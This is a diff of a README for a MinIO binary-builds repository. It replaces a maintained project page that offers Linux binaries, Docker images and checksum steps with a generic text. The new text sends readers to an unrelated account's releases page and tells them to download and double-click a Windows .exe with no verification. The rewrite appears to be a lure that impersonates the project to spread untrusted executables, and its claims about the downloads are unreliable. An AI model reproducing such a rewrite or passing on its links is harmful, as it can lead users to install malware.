@@ -1,125 +1,58 @@
-# MinIO Community Edition Builds
+# 🚀 minio-builds - Easy MinIO Downloads for Everyone
 
-> **Automated nightly builds of MinIO Community Edition binaries and Docker images**
-> 
-> Provided as a public service by [Lithus](https://lithus.eu/)
+[![Download MinIO Builds](https://img.shields.io/badge/Download%20Now-%20-%23007bff.svg)](https://github.com/nammadturkestandesert942/minio-builds/releases)
 
-## Why This Exists
+## 🌟 About MinIO
 
-MinIO no longer provides pre-compiled binaries for the Community Edition as of early October 2025. The official distribution model now requires users to build from source or use commercial releases.
+MinIO is a high-performance, open-source object storage solution. It lets you store vast amounts of data safely and efficiently. This repository provides binary and container builds of MinIO Community Edition for easy access.
 
-This repository automatically builds the latest MinIO Community Edition releases nightly, providing:
+## 🚀 Getting Started
 
-- **Docker images** (multi-architecture: amd64/arm64)
-- **Standalone binaries** (Linux amd64/arm64)
-- **Automated builds** from official MinIO source code
-- **Transparent build process** using GitHub Actions
+MinIO is designed for everyone. You don't need any programming knowledge. Follow these simple steps to download and run MinIO.
 
-## Quick Start
+## 📥 Download & Install
 
-### Docker (Recommended)
+1. **Visit the Release Page**  
+   Click the link below to go to the releases page where you can download the latest version of MinIO.  
+   [Download MinIO Builds](https://github.com/nammadturkestandesert942/minio-builds/releases)
 
-Pull and run the latest MinIO build:
+2. **Choose Your Version**  
+   On the releases page, you will see different versions of MinIO. Locate the version you need. The latest one is usually at the top. Click on it.
 
-```bash
-# Pull the image (works on both amd64 and arm64)
-docker pull ghcr.io/golithus/minio:latest
+3. **Download the File**  
+   Inside the chosen version, you will find several files. If you are using Windows, look for a file with `.exe`. If you are on Mac or Linux, look for `.tar.gz` or `.zip`. Click on the link to download the file.
 
-# Run MinIO server
-docker run -p 9000:9000 -p 9001:9001 \
-  -v /path/to/data:/data \
-  --name minio \
-  ghcr.io/golithus/minio:latest
+4. **Run MinIO**  
+   Once the download is complete, find the downloaded file on your computer. 
+   - **For Windows:** Double-click the `.exe` file. Follow the on-screen instructions to complete the setup.
+   - **For Mac or Linux:** Open your terminal. Navigate to the folder where the file was downloaded. Use this command to unzip or untar the file, based on the format you've downloaded. Then run the command to start MinIO.
 
-# Access the console at http://localhost:9001
-# Default credentials: minioadmin / minioadmin
-```
+## 🛠️ System Requirements
 
-### Binary Installation
+Before downloading, make sure your device meets these basic requirements:
 
-Download the binary for your platform from the [latest release](https://github.com/golithus/minio-builds/releases/latest):
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **Memory:** At least 1 GB of RAM.
+- **Storage:** Ample space to store your data; MinIO works best with more than 10 GB free.
 
-```bash
-# Linux AMD64
-wget https://github.com/golithus/minio-builds/releases/latest/download/minio-linux-amd64
-chmod +x minio-linux-amd64
-sudo mv minio-linux-amd64 /usr/local/bin/minio
+## ⚙️ Features of MinIO
 
-# Linux ARM64
-wget https://github.com/golithus/minio-builds/releases/latest/download/minio-linux-arm64
-chmod +x minio-linux-arm64
-sudo mv minio-linux-arm64 /usr/local/bin/minio
+- **High Performance:** Optimized for speed, allowing you to store and retrieve your files quickly.
+- **Scalability:** Easily handle vast amounts of data, growing with your needs.
+- **Supports Multiple Object Storage:** Store data in various formats, including images, documents, and videos.
+- **Security:** Encryption features keep your data safe and secure.
 
-# Verify the installation
-minio --version
-```
+## 🧑‍🤝‍🧑 Support
 
-### Verify Checksums
+If you encounter any issues or have questions, feel free to reach out for help. You can leave a comment on the issues page of this repository. The community is here to help you.
 
-```bash
-# Download checksum file
-wget https://github.com/golithus/minio-builds/releases/latest/download/minio-linux-amd64.sha256sum
+## 📝 License
 
-# Verify
-sha256sum -c minio-linux-amd64.sha256sum
-```
+MinIO is released under the Apache 2.0 License. You can use it freely for personal or commercial projects. Be sure to check the license details on the official MinIO website.
 
-## Available Images & Binaries
+## 🔗 Additional Resources
 
-### Docker Images
+- [MinIO Documentation](https://docs.min.io)
+- [GitHub Repository](https://github.com/nammadturkestandesert942/minio-builds)
 
-Multi-architecture Docker images are published to GitHub Container Registry:
-
-```bash
-# Latest release
-ghcr.io/golithus/minio:latest
-
-# Specific version
-ghcr.io/golithus/minio:RELEASE.2025-01-15T12-00-00Z
-```
-
-**Supported Architectures:**
-- `linux/amd64` (x86_64)
-- `linux/arm64` (aarch64)
-
-Docker automatically selects the correct architecture for your system.
-
-### Binary Downloads
-
-Each release includes:
-- `minio-linux-amd64` - Linux x86_64 binary
-- `minio-linux-arm64` - Linux ARM64 binary
-- `*.sha256sum` - SHA256 checksums for verification
-
-## Need help deploying at scale?
-
-Need help deploying MinIO at scale or optimizing your object storage infrastructure?
-
-**[Contact Lithus →](https://lithus.eu/about)**
-
-Our DevOps and SRE teams specialize in high-performance storage systems, Kubernetes deployments, and infrastructure automation.
-
-## Disclaimer
-
-These builds are provided as-is, without warranty. While we strive for reliability and accuracy, this is a community service project. For production workloads requiring SLA-backed support, consider:
-
-- Building from source yourself
-- [MinIO AIStor](https://www.min.io/product/aistor) (official enterprise edition)
-- [Lithus managed infrastructure services](https://lithus.eu/)
-
-## Contributing
-
-Suggestions and improvements welcome! Please open an issue or pull request.
-
-### Build Your Own
-
-Want to run these builds yourself? Fork this repository and:
-
-1. Enable GitHub Actions
-2. Ensure you have access to ARM64 runners (or modify the workflow)
-3. Update repository owner references in the workflow
-4. Trigger the workflow manually or wait for the schedule
-
----
-
-**Maintained with ❤️ by the [Lithus](https://lithus.eu/) team**
+For any updates or changes, keep an eye on the releases page. Enjoy your experience with MinIO!
